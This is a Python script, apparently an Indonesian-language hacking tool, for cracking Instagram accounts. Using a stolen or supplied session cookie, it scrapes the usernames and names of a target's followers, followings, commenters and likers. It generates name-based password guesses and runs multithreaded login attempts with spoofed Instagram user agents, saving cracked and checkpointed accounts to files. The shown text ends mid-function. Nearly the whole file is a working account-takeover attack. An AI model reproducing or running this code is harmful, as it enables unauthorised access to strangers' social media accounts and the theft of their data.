...
def Crack_IG():
    banner()
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    cookie = input(f'{B}╰─{b}➤{b} COOKIES : {b}')
    try:
        ...
        with open('.cokiee_ig.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
...
def banner():
 ...
 [bold cyan]|___|___|___|__|___|___|_______|_______|___|___| |___| |_______|_______|    
                        ''',width=78,style=f"bold blue")) 
#-------------------[ MENU]----------------#
def Menu_Instagram():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    try:
        cookie = open('.cokiee_ig.txt','r').read()
        userid = re.findall('sessionid=(\d+)', str(cookie))[0]
    except (FileNotFoundError,IndexError):
        print('%s[%s!%s] Anda Belum Login/Cookie Salah'%(N,M,N));time.sleep(3);Crack_IG()
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall('ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
    ...
    try:
    	print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    	print(f'{B}╰─{b}➤{b} NAMA  : {b}{info}')
    	print(f'{B}╰─{b}➤{b} IDZ   : {b}{userid}')
    	print(f'{B}╰─{b}➤{b} TOOLS : {b}INSTAGRAM')
    except IndexError:print('\n%s[%s!%s] Ups, Ada Kesalahan. Silahkan Konfirmasi Ulang Licensi Kamu'%(N,M,N));time.sleep(3);exit()
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    print(f'{B}╰─{b}➤{B}[{P}01{B}]{P} Crack Pengikut   ')
    print(f'{B}╰─{b}➤{B}[{P}02{B}]{P} Crack Mwngikuti   ')
    print(f'{B}╰─{b}➤{B}[{P}03{B}]{P} Crack Komentar')
    print(f'{B}╰─{b}➤{B}[{P}04{B}]{P} Crack Menyukai    ') 
    print(f'{B}╰─{b}➤{B}[{P}05{B}]{P} Check Hasil    ')
    print(f'{B}╭─{b}➤{B}[{P}00{B}]{P} Menu Utama')
    print(f"{B}╰────────────────────────────────────────────────────────────────────────────{b}➤")		
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    pilihan = input(f"{B}╰─{b}➤{b} PILIH : {b}")
#-------------------[ metode-FOLLOWER]----------------#    
    if pilihan in   ['1','01']:
       print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
       target = input(f"{B}╰─{b}➤{P} Nama Target : {b}")
       target = Dump_ID_V1(target)
       total  = Follower(target, '', cookie)
...
#-------------------[ metode-KOMENTAR]----------------#
       ...
       print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
       target = input(f"{B}╰─{b}➤{P} Nama Target : {b}")
       find_id = Dump_ID_V2(target,cookie)
       total = Komentar(cookie, find_id,'')
       if total is False:exit()
       else:metode()
#-------------------[ metode-MENYUKAI]----------------#
       ...
       target = input(f"{B}╰─{b}➤{P} Nama Target : {b}")
       find_id = Dump_ID_V2(target,cookie)
       total = Menyukai(cookie, find_id)
       if total is False:exit()
       else:metode()
#-------------------[ CEK RESULT]----------------#
    elif cek_pilihan in ['5','05']:
       print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
       print(f"{B}╰─{b}➤{B}[{P}01{B}]{P} Cek Hasil OK")
       print(f"{B}╭─{b}➤{B}[{P}03{B}]{P} Cek Hasil CP")
       print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
       hash = input(f"{B}╰─{b}➤{b} PILIH : {b}")
       if cek_pilihan in   ['1','01']:
          try:os.system('ul OK/OK.txt')
          except:exit()
       elif cek_pilihan in ['2','02']:
          try:os.system('ul CP/CP.txt')
          except:exit()
       else:menu(waktu_tersisa)
#-------------------[ Menu Utama]----------------#
    elif cek_pilihan in ['00','00']:
       lecensi()
#-------------------[ SCRAB FOLLOWER]----------------#
def Follower(user_id, max_id, cookie) -> str:
    for y in user_id:
       try:
           HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
           ...
           for target in apcb['users']:
               target = '%s<<=>>%s'%(target['username'], target['full_name'])
               if target not in all_items:
                  all_items.append(target)
                  sys.stdout.write(f"\r{B}╭─{b}➤{P} Terkumpul   : {b}{len(all_items)} {P}ID"),
                  sys.stdout.flush()
           if 'next_max_id' in apcb:
               Follower(user_id, apcb['next_max_id'], cookie)
...
#-------------------[ SCRAB-FOLLOWING]----------------# 
def Following(user_id, max_id, cookie) -> str:
    for y in user_id:
       try:
           HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
           PARAMS = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'}
           ...
           for target in apcb['users']:
               ...
               if target not in all_items:
                  ...
                  sys.stdout.flush()
           if 'next_max_id' in apcb:
               Following(user_id, apcb['next_max_id'], cookie)
       except (httpx.RemoteProtocolError,AttributeError,httpx.ConnectError,KeyboardInterrupt,KeyError):
           pass
    if len(all_items) == 0:return False
    else:return True
#-------------------[SCRAB-KOMENTAR]----------------#
def Komentar(cookie, media_id, max_min):
    for idm in media_id:
        try:
             HEADERS = {
             ...
             if 'next_min_id' in str(response):
                Komentar(cookie, media_id, response['next_min_id'])
        except Exception as e:pass
    if len(all_items) == 0:return False
    else:return True
#-------------------[SCRAB-MENYUKAI]----------------#
def Menyukai(cookie, media_id):
    for idm in media_id:
        try:
             HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
             ...
             pwoto  = httpx.get('https://accountscenter.instagram.com/personal_info/', cookies = {'cookie':cookie}).text
             uid  = re.findall('"actorID":"(\d+)"', str(pwoto))[0]
             data = {
                 'av': uid,
                 '__d': 'www',
                 '__user': '0',
                 '__a': '1',
                 '__req': 'm',
                 '__hs': re.findall('"haste_session":"(.*?)"', str(pwoto))[0],
                 'dpr': '2',
                 '__ccg': 'UNKNOWN',
                 '__rev': re.search('{"rev":(.*?)}',str(pwoto)).group(1),
                 '__s': '',
                 '__hsi': re.findall('"hsi":"(\d+)"',str(pwoto))[0],
                 '__dyn': '',
                 '__csr': '',
                 '__comet_req': '7',
                 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(pwoto)).group(1),
                 'jazoest': re.findall('&jazoest=(\d+)',str(pwoto))[0],
                 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(pwoto)).group(1),
                 '__spin_r': re.findall('"__spin_r":(\d+)', str(pwoto))[0],
                 '__spin_b': 'trunk',
                 '__spin_t': re.findall('"__spin_t":(\d+)', str(pwoto))[0],
...
def metode():
	...
	print(f"{B}╰────────────────────────────────────────────────────────────────────────────{b}➤")	
	print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
	print(f"{B}╰─{b}➤{B}[{P}01{B}]{P} Metode V1")
	print(f"{B}|─{b}➤{B}[{P}02{B}]{P} Metode V2")
	print(f"{B}╭─{b}➤{B}[{P}03{B}]{P} Metode V3")
	print(f"{B}╰────────────────────────────────────────────────────────────────────────────{b}➤")	
	print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
	asu = input(f'{B}╰─{b}➤{P} Pilih : {b}')
	apsw(asu)
def apsw(method):
    global keterangan, tampilan
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    print(f"{B}╰─{b}➤{B}[{P}01{B}]{P} Password Manual")
    print(f"{B}╭─{b}➤{B}[{P}03{B}]{P} Password Otomatis")
    print(f"{B}╰────────────────────────────────────────────────────────────────────────────{b}➤")		
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    weskas = input(f'{B}╰─{b}➤{P} Pilih : {b}').lower()
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    if weskas in ['1','01']:
       password = input(f'{B}╰─{b}➤{b} PASSWORD :{b} ')
       for user in password.split(','):
           if len(user) <=5:pass
           else:pw_tambahan.append(user)
    else:pass
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    print(f"{B}╰─{b}➤{B}[{P}01{B}]{P} Crack Cepat")
    print(f"{B}╭─{b}➤{B}[{P}03{B}]{P} Crack Lambat")
    print(f"{B}╰────────────────────────────────────────────────────────────────────────────{b}➤")		
    print(f"{B}╭────────────────────────────────────────────────────────────────────────────{b}➤")			
    lib = input(f'{B}╰─{b}➤{P} Pilih : {b}')
    if lib in ['1','01']:login.update({'Lib':'htx'})
    else:login.update({'Lib':'req'})
    keterangan = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'))
    tampilan = keterangan.add_task('',total=len(all_items))
    with keterangan:
       with ThreadPoolExec(max_workers=35) as pikha:
          for i in all_items:
             username, password = i.split('<<=>>')
             apacobabg = passwordmu(password.lower())
...
def passwordmu(name):
    pwoto = []
    if len(pw_tambahan) >=1:
       for user in pw_tambahan:
           pwoto.append(user)
    for user in name.split(' '):
        if len(user) <3:pass
        elif len(user) == 3 or len(user) == 4 or len(user) == 5:     
           pwoto.append(user+'123')
           pwoto.append(user+'1234')
           pwoto.append(user+'12345')
           pwoto.append(f'{user.capitalize()}123')
           pwoto.append(f'{user.capitalize()}1234')
        else:
           pwoto.append(user+'123')
           pwoto.append(user+'1234')
           pwoto.append(user+'12345')
...
#----------[USER AGENT V2]---------#
    def UserAgent():
        ...
        rc = random.choice
        andro = rc([
            '24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        dpis = rc([
            '320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = rc([
        ...
        ua1 = f'Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)'
        ua2 = f'Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)'
        ua3 = f'Instagram 37.0.0.21.97 Android (21/5.0.2; 320dpi; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)'
        ua4 = f'Instagram 37.0.0.21.97 Android (19/4.4.2; 240dpi; 480x782; LGE/lge; LG-D331; luv80ss; mt6582; es_VE; 98288237)'
        ua5 = f'Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)'
        uaa = rc([ua1,ua2,ua3,ua4,ua5])
        return uaa

def i_insta(username, password):
    global hitung,success,checkpoint, login
    keterangan.update(tampilan,description=f'[bold green]AraiiXyzz [bold cyan]{hitung}[bold red]/[bold blue]{len(all_items)}[bold cyan] OK:[bold cyan]{success}[bold red] / [bold blue]CP : [bold blue]{checkpoint}')
    keterangan.advance(tampilan)
    for pw in password:
        try:
            request = login['Lib']
